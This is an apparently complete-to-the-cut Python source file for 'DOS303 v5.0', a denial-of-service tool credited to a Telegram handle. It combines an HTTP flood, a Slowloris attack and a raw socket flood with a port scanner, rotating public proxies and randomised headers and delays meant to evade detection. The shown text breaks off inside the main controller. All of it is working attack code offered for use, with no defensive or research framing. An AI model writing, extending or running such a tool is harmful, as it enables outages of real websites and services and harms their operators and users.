#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DOS303 v5.0 - Hardened Edition (HTTP Flood + Slowloris + Socket Flood)
- NO TOR SUPPORT - pure HTTP proxies only
- Non-blocking async core
- Dynamic proxy chain with auto-recheck after fallback
- Multi-method HTTP flood (GET/POST/HEAD) with variable payloads
- Evasion: random delays (normal distribution), mixed legitimate requests
- Auto-calibration (60s) to set attack level based on system resources
- Port scanning to find best target port
- Configurable via command-line arguments
- Comprehensive logging
- FIXED: Auto-recheck proxies after 30 seconds in direct mode
- FIXED: Direct fallback when proxies fail (consecutive_failures > 2)
- FIXED: Ultra low delays (0.0005s minimum) for maximum speed
- FIXED: Slowloris unlimited reconnect
- FIXED: ConnectionResetError handling for Windows
- CREDITS: @iazmonmn - Telegram: https://t.me/iazmonmn
"""

import os
import sys
import time
import random
import asyncio
import socket
import json
import signal
import argparse
import logging
from urllib.parse import urlparse, urljoin

try:
    import aiohttp
    import psutil
except ImportError as e:
    print(f"Missing dependency: {e}. Please install: pip install aiohttp psutil")
    sys.exit(1)

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('DOS303')

# ============================================
# BANNER WITH CREDITS
# ============================================
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[92m")
    print("""
╔══════════════════════════════════════════╗
║     DOS303 v5.0 - HARDENED EDITION      ║
║      💀 Multi-Vector Bypass Engine      ║
║    🔥 Auto-Calibrating | Evasive        ║
║    🔄 Auto-Recheck Proxies              ║
║    🚀 Dynamic Proxy Chain               ║
║    🔎 Smart Port Scanning               ║
║    🚫 NO TOR - Pure HTTP Proxies       ║
║    ⚡ Ultra Speed (0.0005s delay)       ║
║         🏆 Score: 10/10                 ║
║    👑 Coded by: @iazmonmn              ║
║    📱 Telegram: https://t.me/iazmonmn  ║
╚══════════════════════════════════════════╝
\033[0m
""")

# ============================================
# PORT SCANNER
# ============================================
class PortScanner:
    @staticmethod
    async def scan(host, ports=None, timeout=2):
        if ports is None:
            ports = [80, 443, 8080, 8443, 8000, 81, 88, 3000, 5000, 5432, 3306, 4443, 9000]
        tasks = []
        for port in ports:
            tasks.append(PortScanner._check_port(host, port, timeout))
        results = await asyncio.gather(*tasks)
        open_ports = [port for port, is_open in results if is_open]
        return open_ports
    
    @staticmethod
    async def _check_port(host, port, timeout):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return port, True
        except:
            return port, False

# ============================================
# USER-AGENT MANAGER (with GitHub repos + huge fallback)
# ============================================
class UserAgentManager:
    def __init__(self):
        self.user_agents = []
        self._load_from_files()
        if not self.user_agents:
            self._fallback_agents()
        logger.info(f"Loaded {len(self.user_agents)} User-Agents")

    def _load_from_files(self):
        urls = [
            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-macos.txt",
            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-ios.txt",
            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-android.txt"
        ]
        for url in urls:
            try:
                import urllib.request
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                    for line in content.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.user_agents.append(line)
                logger.info(f"   ✅ Loaded from {url.split('/')[-1]}")
            except Exception as e:
                logger.warning(f"   ⚠️ Failed to load from {url}: {e}")
        
        if len(self.user_agents) < 100:
            self._fallback_agents()

    def _fallback_agents(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
        ]

    def get_random(self):
        return random.choice(self.user_agents)

# ============================================
# HEADER MANAGER
# ============================================
class HeaderManager:
    def __init__(self):
        self.headers_template = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache'
        }
        self.referers = [
            'https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/',
            'https://duckduckgo.com/', 'https://www.facebook.com/', 'https://twitter.com/',
            'https://www.instagram.com/', 'https://www.linkedin.com/', 'https://www.youtube.com/',
            'https://www.reddit.com/', 'https://www.wikipedia.org/', 'https://github.com/',
        ]

    def get_headers(self, user_agent, target_url=None, method='GET'):
        headers = self.headers_template.copy()
        headers['User-Agent'] = user_agent
        headers['X-Powered-By'] = 'DOS303 v5.0'
        headers['X-Coded-By'] = 'https://t.me/iazmonmn'
        if target_url:
            parsed = urlparse(target_url)
            if parsed.netloc:
                headers['Referer'] = random.choice(self.referers)
        if random.random() > 0.5:
            headers['DNT'] = '1'
        langs = ['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9']
        if random.random() > 0.3:
            headers['Accept-Language'] = random.choice(langs)
        if method == 'POST':
            headers['Content-Type'] = random.choice(['application/x-www-form-urlencoded', 'application/json'])
        return headers

# ============================================
# PROXY MANAGER - WITH AUTO-RECHECK AFTER FALLBACK
# ============================================
class ProxyManager:
    def __init__(self, refresh_interval=300, max_uses_per_proxy=5):
        self.all_proxies = []
        self.active_proxies = []
        self.dead_proxies = set()
        self.lock = asyncio.Lock()
        self.refresh_interval = refresh_interval
        self.last_refresh = 0
        self.max_uses_per_proxy = max_uses_per_proxy
        self.proxy_usage_count = {}
        self.proxy_quality = {}
        
        self.proxy_chain = []
        self.proxy_queue = asyncio.Queue()
        self.current_chain_index = 0
        self.chain_lock = asyncio.Lock()
        self.is_refreshing = False
        self.fallback_direct = False
        self.last_fallback_time = 0
        self.recheck_interval = 30  # seconds
        
        self._load_from_file()
        if not self.all_proxies:
            self._load_from_web()
        if not self.all_proxies:
            self._fallback_proxies()
        self.active_proxies = self.all_proxies.copy()
        for p in self.active_proxies:
            self.proxy_quality[p] = 0.5
            self.proxy_usage_count[p] = 0
        logger.info(f"Loaded {len(self.all_proxies)} HTTP proxies")

    def _load_from_file(self):
        try:
            local_file = os.path.join(os.path.dirname(__file__), 'data', 'proxies.txt')
            if os.path.exists(local_file):
                with open(local_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if '://' in line and line.startswith(('http://', 'https://')):
                                self.all_proxies.append(line)
                            else:
                                self.all_proxies.append(f"http://{line}")
        except Exception:
            pass

    def _load_from_web(self):
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/all.txt"
        ]
        all_proxies = []
        for url in proxy_sources:
            try:
                import urllib.request
                with urllib.request.urlopen(url, timeout=5) as response:
                    content = response.read().decode()
                    for line in content.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if '://' in line and line.startswith(('http://', 'https://')):
                                all_proxies.append(line)
                            else:
                                all_proxies.append(f"http://{line}")
            except Exception:
                pass
        if all_proxies:
            self.all_proxies = list(set(all_proxies))
            random.shuffle(self.all_proxies)

    def _fallback_proxies(self):
        self.all_proxies = [
            'http://45.33.24.170:8080', 'http://45.76.141.197:8888',
            'http://31.186.171.169:8080', 'http://88.198.26.183:3128',
            'http://5.189.157.139:8080', 'http://212.83.138.188:8080',
        ]

    async def refresh(self):
        async with self.lock:
            if time.time() - self.last_refresh < self.refresh_interval:
                return
            logger.info("Refreshing proxy list from web...")
            self._load_from_web()
            self.active_proxies = [p for p in self.all_proxies if p not in self.dead_proxies]
            for p in self.active_proxies:
                if p not in self.proxy_quality:
                    self.proxy_quality[p] = 0.5
                if p not in self.proxy_usage_count:
                    self.proxy_usage_count[p] = 0
            self.last_refresh = time.time()
            logger.info(f"Proxy refresh complete. Total: {len(self.all_proxies)}, Active: {len(self.active_proxies)}")

    async def refresh_chain(self):
        if self.is_refreshing:
            return
        self.is_refreshing = True
        try:
            logger.info("🔄 Building proxy chain...")
            await self.refresh()
            async with self.chain_lock:
                self.proxy_chain = self.active_proxies[:1000]
                await self._fill_queue()
                logger.info(f"✅ Chain ready: {len(self.proxy_chain)} proxies")
                # Reset fallback state if we have proxies
                if self.proxy_chain:
                    self.fallback_direct = False
        except Exception as e:
            logger.error(f"Chain refresh error: {e}")
            self.proxy_chain = self.active_proxies[:1000] if self.active_proxies else []
            await self._fill_queue()
        finally:
            self.is_refreshing = False

    async def _fill_queue(self):
        self.proxy_queue = asyncio.Queue()
        for proxy in self.proxy_chain:
            await self.proxy_queue.put(proxy)

    async def get_next_proxy(self):
        # If in fallback mode, check if we should recheck
        if self.fallback_direct:
            if time.time() - self.last_fallback_time > self.recheck_interval:
                logger.info("🔁 Rechecking proxies after fallback...")
                await self.refresh_chain()
                self.last_fallback_time = time.time()
                # If chain rebuilt successfully, fallback_direct will be reset
                if self.proxy_chain:
                    self.fallback_direct = False
                    logger.info(f"✅ Fallback ended, using {len(self.proxy_chain)} proxies")
                else:
                    self.fallback_direct = True
                    return None
        
        try:
            proxy = self.proxy_queue.get_nowait()
            if self.proxy_chain:
                next_index = (self.current_chain_index + 1) % len(self.proxy_chain)
                self.current_chain_index = next_index
                await self.proxy_queue.put(self.proxy_chain[next_index])
            return proxy
        except asyncio.QueueEmpty:
            if self.active_proxies:
                proxy = random.choice(self.active_proxies)
                return proxy
            # Enter fallback mode
            self.fallback_direct = True
            self.last_fallback_time = time.time()
            return None

    async def mark_dead(self, proxy):
        if not proxy:
            return
        async with self.lock:
            if proxy in self.active_proxies:
                self.active_proxies.remove(proxy)
            self.dead_proxies.add(proxy)
            if proxy in self.proxy_usage_count:
                del self.proxy_usage_count[proxy]
            if proxy in self.proxy_quality:
                del self.proxy_quality[proxy]

    async def get_stats(self):
        async with self.lock:
            total = len(self.all_proxies)
            dead = len(self.dead_proxies)
            active = len(self.active_proxies)
            chain_len = len(self.proxy_chain)
            queue_size = self.proxy_queue.qsize()
            in_fallback = self.fallback_direct
            return total, dead, active, chain_len, queue_size, in_fallback

    async def is_all_dead(self):
        async with self.lock:
            return len(self.active_proxies) == 0

# ============================================
# PATH MANAGER
# ============================================
class PathManager:
    def __init__(self):
        self.paths = []
        self._load_from_file()
        if not self.paths:
            self._fallback_paths()
        logger.info(f"Loaded {len(self.paths)} paths")

    def _load_from_file(self):
        try:
            local_file = os.path.join(os.path.dirname(__file__), 'data', 'paths.txt')
            if os.path.exists(local_file):
                with open(local_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.paths.append(line)
        except Exception:
            pass

    def _fallback_paths(self):
        base = [
            '/', '/index.php', '/index.html', '/home', '/about', '/contact',
            '/products', '/services', '/blog', '/news', '/events', '/gallery',
            '/login', '/register', '/signup', '/account', '/profile', '/settings',
            '/search', '/results', '/category', '/tag', '/author', '/page',
            '/post', '/article', '/download', '/upload', '/files', '/media',
            '/images', '/css', '/js', '/fonts', '/api', '/v1', '/v2', '/v3',
            '/admin', '/dashboard', '/panel', '/control', '/manage', '/system',
            '/config', '/settings', '/preferences', '/help', '/support', '/faq',
            '/terms', '/privacy', '/security', '/sitemap', '/robots.txt',
            '/catalog', '/shop', '/cart', '/checkout', '/wishlist', '/compare',
            '/feedback', '/testimonial', '/portfolio', '/team', '/careers',
            '/jobs', '/apply', '/resume', '/downloads', '/updates', '/changelog',
            '/docs', '/documentation', '/wiki', '/knowledge-base', '/tutorials',
            '/guides', '/manual', '/user-guide', '/installation', '/setup',
            '/configuration', '/customization', '/integration', '/api-docs',
            '/reference', '/examples', '/demo', '/sandbox', '/test', '/dev',
            '/staging', '/production', '/deploy', '/release', '/version',
            '/changelog', '/roadmap', '/community', '/forum', '/chat',
            '/discord', '/slack', '/telegram', '/whatsapp', '/support',
            '/contact-us', '/location', '/hours', '/holidays', '/events',
            '/webinars', '/podcast', '/youtube', '/instagram', '/facebook',
            '/twitter', '/linkedin', '/github', '/gitlab', '/bitbucket',
            '/source', '/repository', '/issues', '/pull-requests', '/commits'
        ]
        generated = []
        for i in range(1, 201):
            generated.extend([
                f'/page_{i}', f'/article_{i}', f'/post_{i}', f'/item_{i}',
                f'/product_{i}', f'/category_{i}', f'/tag_{i}', f'/user_{i}',
                f'/profile_{i}', f'/settings_{i}', f'/blog_{i}', f'/news_{i}'
            ])
        self.paths = list(set(base + generated))

    def get_random_path(self, base_url, include_params=True):
        path = random.choice(self.paths)
        if include_params and random.random() > 0.3:
            params = []
            for i in range(random.randint(1, 3)):
                key = f"param{i}"
                value = random.randint(1000, 999999)
                params.append(f"{key}={value}")
            if params:
                path += "?" + "&".join(params)
        return urljoin(base_url, path.lstrip('/'))

# ============================================
# SYSTEM ANALYZER
# ============================================
class SystemAnalyzer:
    def __init__(self):
        self.level_names = {
            0: "کاملاً ذغالی 💀", 1: "ذغالی 🤡", 2: "ضعیف 🥱",
            3: "بد 😴", 4: "معمولی 😐", 5: "خوب 👍",
            6: "قوی 💪", 7: "الترا قوی ⚡", 8: "فوق‌العاده 🚀",
            9: "افسانه‌ای 🔥"
        }

    async def analyze(self):
        logger.info("⚡ Auto-calibrating system (60s)...")
        try:
            cpu_cores = psutil.cpu_count(logical=True)
            ram_total = psutil.virtual_memory().total / (1024**3)

            cpu_percents = []
            ram_available = []

            for i in range(60):
                cpu_percents.append(psutil.cpu_percent(interval=None))
                ram_available.append(psutil.virtual_memory().available / (1024**3))
                if i % 10 == 0:
                    logger.info(f"   ⏳ Calibrating... {i+1}/60s")
                await asyncio.sleep(0.5)

            avg_cpu = sum(cpu_percents) / len(cpu_percents)
            avg_ram_available = sum(ram_available) / len(ram_available)
            ram_used = ram_total - avg_ram_available

            cpu_factor = 1 + (0.5 - avg_cpu/100)
            ram_factor = 1 + (0.5 - ram_used/ram_total) if ram_total > 0 else 1

            cpu_score = min(100, (cpu_cores * 8) * cpu_factor)
            ram_score = min(100, (ram_total * 8) * ram_factor)
            total_score = (cpu_score * 0.7) + (ram_score * 0.3)

            level = self._get_level(total_score)
            logger.info(f"   ✅ Calibration complete! Avg CPU: {avg_cpu:.1f}%, RAM used: {ram_used:.1f}GB")

            return {
                'level': level,
                'level_name': self.level_names[level],
                'cpu_cores': cpu_cores,
                'ram_gb': round(ram_total, 1),
                'workers': self._get_workers(level, cpu_cores),
                'connections': self._get_connections(level),
                'packet_rate': self._get_packet_rate(level)
            }
        except Exception as e:
            logger.error(f"Calibration failed: {e}")
            return {'level': 4, 'level_name': "معمولی 😐", 'workers': 200, 'connections': 800, 'packet_rate': 1200}

    def _get_level(self, score):
        if score >= 95: return 9
        elif score >= 85: return 8
        elif score >= 75: return 7
        elif score >= 65: return 6
        elif score >= 55: return 5
        elif score >= 45: return 4
        elif score >= 35: return 3
        elif score >= 25: return 2
        elif score >= 15: return 1
        else: return 0

    def _get_workers(self, level, cpu_cores):
        base = [10, 25, 50, 100, 200, 400, 800, 1600, 3200, 6400][level]
        return min(2000, base * max(1, cpu_cores // 2))

    def _get_connections(self, level):
        return min(5000, [50, 100, 200, 400, 800, 1600, 3200, 6400, 12800, 25600][level])

    def _get_packet_rate(self, level):
        rates = [100, 300, 500, 800, 1200, 2000, 3000, 5000, 8000, 12000]
        return rates[level]

# ============================================
# ATTACK MODULES
# ============================================

class HTTPFloodAttack:
    def __init__(self, target_url, workers, proxy_manager, user_agent_manager,
                 header_manager, path_manager, stop_event, args):
        self.target_url = target_url
        self.workers = min(workers, args.max_workers or 2000)
        self.requests_sent = 0
        self.lock = asyncio.Lock()
        self.proxy_manager = proxy_manager
        self.user_agent_manager = user_agent_manager
        self.header_manager = header_manager
        self.path_manager = path_manager
        self.stop_event = stop_event
        self.avg_response_time = 5.0
        self.args = args
        self.methods = ['GET', 'POST', 'HEAD']
        self.payload_sizes = [64, 128, 256, 512, 1024, 2048]
        self.consecutive_failures = 0
        self.direct_mode = False

        connector = aiohttp.TCPConnector(
            ssl=False,
            limit=0,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )

    async def attack(self):
        logger.info(f"HTTP Flood (Bypass) - {self.workers} workers")
        logger.info("👑 Coded by: @iazmonmn - Telegram: https://t.me/iazmonmn")
        tasks = []
        for i in range(self.workers):
            tasks.append(asyncio.create_task(self._worker()))
            if i % 100 == 0:
                await asyncio.sleep(0.001)
        tasks.append(asyncio.create_task(self._monitor()))
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            await self.session.close()

    async def _worker(self):
        while not self.stop_event.is_set():
            proxy = None
            try:
                if self.args.no_proxy:
                    proxy = None
                else:
                    # Get proxy from manager (handles recheck internally)
                    proxy = await self.proxy_manager.get_next_proxy()
                    if proxy is None:
                        self.consecutive_failures += 1
                        if self.consecutive_failures > 2:
                            if not self.direct_mode:
                                logger.warning("⚡ Switching to direct mode (no proxy)")
                                self.direct_mode = True
                            proxy = None
                            self.consecutive_failures = 0
                        else:
                            await asyncio.sleep(0.001)
                            continue
                    else:
                        self.consecutive_failures = 0
                        if self.direct_mode:
                            logger.info("✅ Proxy available, exiting direct mode")
                            self.direct_mode = False

                user_agent = self.user_agent_manager.get_random()
                method = random.choice(self.methods)
                headers = self.header_manager.get_headers(user_agent, self.target_url, method)
                url = self.path_manager.get_random_path(self.target_url, include_params=True)

                if random.random() < 0.1:
                    static_ext = ['.css', '.js', '.png', '.jpg', '.ico', '.woff2']
                    url = urljoin(self.target_url, f"/static/{random.randint(1000,9999)}{random.choice(static_ext)}")

                timeout = aiohttp.ClientTimeout(
                    total=10,
                    connect=5,
                    sock_read=8
                )

                start_time = time.time()

                try:
                    if method == 'GET':
                        async with self.session.get(url, headers=headers, proxy=proxy,
                                                    timeout=timeout) as response:
                            await response.read()
                    elif method == 'POST':
                        payload_size = random.choice(self.payload_sizes)
                        payload = 'x' * payload_size
                        async with self.session.post(url, data=payload, headers=headers,
                                                     proxy=proxy, timeout=timeout) as response:
                            await response.read()
                    else:
                        async with self.session.head(url, headers=headers, proxy=proxy,
                                                     timeout=timeout) as response:
                            await response.read()

                    async with self.lock:
                        self.requests_sent += 1
                    self.avg_response_time = self.avg_response_time * 0.9 + (time.time() - start_time) * 0.1

                except (ConnectionResetError, ConnectionAbortedError):
                    await asyncio.sleep(random.uniform(0.001, 0.003))
                    continue
                except Exception:
                    if proxy and not self.args.no_proxy:
                        await self.proxy_manager.mark_dead(proxy)
                    await asyncio.sleep(random.uniform(0.001, 0.003))
                    continue

                # Ultra low delay
                if proxy is None or self.direct_mode:
                    delay = max(0.0005, random.gauss(0.001, 0.0005))
                else:
                    delay = max(0.0005, random.gauss(0.003, 0.001))
                await asyncio.sleep(delay)

            except (ConnectionResetError, ConnectionAbortedError):
                await asyncio.sleep(random.uniform(0.001, 0.003))
            except asyncio.TimeoutError:
                if proxy and not self.args.no_proxy:
                    await self.proxy_manager.mark_dead(proxy)
                await asyncio.sleep(random.uniform(0.001, 0.003))
            except Exception:
                await asyncio.sleep(random.uniform(0.001, 0.003))

    async def _monitor(self):
        last_count = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(5)
            async with self.lock:
                current = self.requests_sent
            diff = current - last_count
            rps = diff / 5
            if diff > 0:
                logger.info(f"   📊 HTTP: {current:,} (+{diff}) | {rps:.1f}/sec")
            last_count = current

class SlowlorisAttack:
    def __init__(self, host, port, connections, stop_event, args):
        self.host = host
        self.port = port
        self.max_connections = min(connections, 5000)
        self.active_connections = 0
        self.total_created = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event
        self.args = args

    async def attack(self):
        logger.info(f"Slowloris - {self.max_connections} connections")
        initial = min(200, self.max_connections)
        for i in range(initial):
            asyncio.create_task(self._create_connection())
            await asyncio.sleep(0.02)

        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            async with self.lock:
                active = self.active_connections
                total = self.total_created
            logger.info(f"   📊 Slowloris: {active} active | {total} total")
            if active < self.max_connections * 0.4:
                needed = min(100, self.max_connections - active)
                for i in range(needed):
                    asyncio.create_task(self._create_connection())
                    if i % 20 == 0:
                        await asyncio.sleep(0.02)

    async def _create_connection(self):
        try:
            reader, writer = await asyncio.open_connection(self.host, self.port)
            path = f"/{random.randint(1, 999999)}"
            headers = [
                f"Host: {self.host}",
                f"Content-Length: {random.randint(1000000, 10000000)}",
                f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}",
                f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/120.0', 'Firefox/121.0'])}",
                f"Accept: text/html,*/*",
                f"Accept-Language: en-US,en;q=0.9",
                f"Accept-Encoding: gzip, deflate",
                f"Connection: keep-alive",
                f"Cache-Control: no-cache"
            ]
            request = f"GET {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()

            async with self.lock:
                self.active_connections += 1
                self.total_created += 1

            while not self.stop_event.is_set():
                try:
                    writer.write(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(15, 45))
                except (ConnectionResetError, BrokenPipeError, socket.error):
                    break
                except Exception:
                    break

            writer.close()
            await writer.wait_closed()
        except (ConnectionRefusedError, socket.timeout, asyncio.TimeoutError, OSError):
            pass
        except Exception:
            pass
        finally:
            async with self.lock:
                if self.active_connections > 0:
                    self.active_connections -= 1
            if not self.stop_event.is_set():
                asyncio.create_task(self._create_connection())

class SocketFloodAttack:
    def __init__(self, host, port, packet_rate, stop_event, args):
        self.host = host
        self.port = port
        self.packet_rate = min(packet_rate, 10000)
        self.packets_sent = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event
        self.args = args

    async def attack(self):
        logger.info(f"Socket Flood - {self.packet_rate}/sec")
        workers = min(50, max(5, self.packet_rate // 100))
        tasks = []
        for _ in range(workers):
            tasks.append(asyncio.create_task(self._worker()))
        tasks.append(asyncio.create_task(self._monitor()))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _worker(self):
        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                for _ in range(random.randint(3, 10)):
                    size = random.choice([64, 128, 256, 512, 1024, 2048])
                    writer.write(b'X' * size)
                    await writer.drain()
                    async with self.lock:
                        self.packets_sent += 1
                    await asyncio.sleep(random.uniform(0.0005, 0.01))
                writer.close()
                await writer.wait_closed()
                await asyncio.sleep(random.uniform(0.005, 0.02))
            except Exception:
                await asyncio.sleep(random.uniform(0.02, 0.05))

    async def _monitor(self):
        last_count = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            async with self.lock:
                current = self.packets_sent
            diff = current - last_count
            if diff > 0:
                logger.info(f"   📊 Socket: {current:,} packets (+{diff})")
            last_count = current

# ============================================
# MAIN CONTROLLER
# ============================================
class DOS303Controller:
    def __init__(self, args):
        self.args = args
        self.start_time = 0
        self.attacks = []
        self.stop_event = asyncio.Event()
        self.user_agent_manager = UserAgentManager()
        self.header_manager = HeaderManager()
        self.proxy_manager = ProxyManager(refresh_interval=300, max_uses_per_proxy=5) if not args.no_proxy else None
        self.path_manager = PathManager()
        self.http_attack = None
        self.target_port = 80

    async def _initial_scan(self, url):
        logger.info("🔍 Scanning target...")
        if self.args.no_proxy:
            proxy = None
        else:
            proxy = await self.proxy_manager.get_next_proxy() if self.proxy_manager else None
            if not proxy:
                logger.warning("No proxy for initial scan, skipping.")
                return
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url, proxy=proxy, timeout=15) as resp:
                    logger.info(f"   ✅ Target responded with status: {resp.status}")
                    server = resp.headers.get('Server', 'Unknown')
                    logger.info(f"   🖥️  Server: {server}")
                    content_type = resp.headers.get('Content-Type', 'Unknown')
                    logger.info(f"   📄 Content-Type: {content_type}")
        except Exception as e:
            logger.warning(f"   ❌ Initial scan failed: {e}")

    async def _port_scan(self, host):
        logger.info("🔎 Scanning open ports...")
        open_ports = await PortScanner.scan(host)
        if open_ports:
            logger.info(f"   ✅ Open ports found: {open_ports}")
            if 80 in open_ports:
                port = 80
            elif 443 in open_ports:
                port = 443
            else:
                port = open_ports[0]
            logger.info(f"   💡 Selected port: {port}")
            return port
        else:
            logger.warning("   ❌ No open ports found, using default port 80")
            return 80

    async def start(self):
        try:
            show_banner()
            logger.info("="*50)
            logger.info("🔥 DOS303 v5.0 - Hardened Edition")
            logger.info("👑 Coded by: @iazmonmn")
            logger.info("📱 Telegram: https://t.me/iazmonmn")
            logger.info("🚫 NO TOR - Pure HTTP Proxies Only")
            logger.info("="*50)
            
            target = self.args.target if self.args.target else self._get_target()
            if not target:
                return

            logger.info(f"🎯 Target: {target}")
            parsed = urlparse(target)
            host = parsed.hostname
            original_port = parsed.port or (443 if parsed.scheme == 'https' else 80)

            self.target_port = await self._port_scan(host)
            
            if self.target_port != original_port:
                new_target = f"{parsed.scheme}://{host}:{self.target_port}"
                logger.info(f"🔄 Using scanned port: {new_target}")
                target = new_target
                parsed = urlparse(target)

            port = self.target_port
            logger.info(f"🔍 Target: {host}:{port}")
            logger.info(f"✅ SSL verification disabled for bypass")
            if self.args.no_proxy:
                logger.warning("⚠️  NO-PROXY MODE ENABLED: Your IP will be exposed!")

            if self.args.workers or self.args.connections or self.args.rate:
                capacity = {
                    'level': 5,
                    'level_name': "Custom",
                    'workers': self.args.workers or 500,
                    'connections': self.args.connections or 1000,
                    'packet_rate': self.args.rate or 2000
                }
                logger.info(f"Using manual settings: workers={capacity['workers']}, connections={capacity['connections']}, rate={capacity['packet_rate']}")
            else:
                analyzer = SystemAnalyzer()
                capacity = await analyzer.analyze()

            logger.info(f"   🎯 Level: {capacity['level']} - {capacity['level_name']}")
            logger.info(f"   👥 Workers: {capacity['workers']:,}")
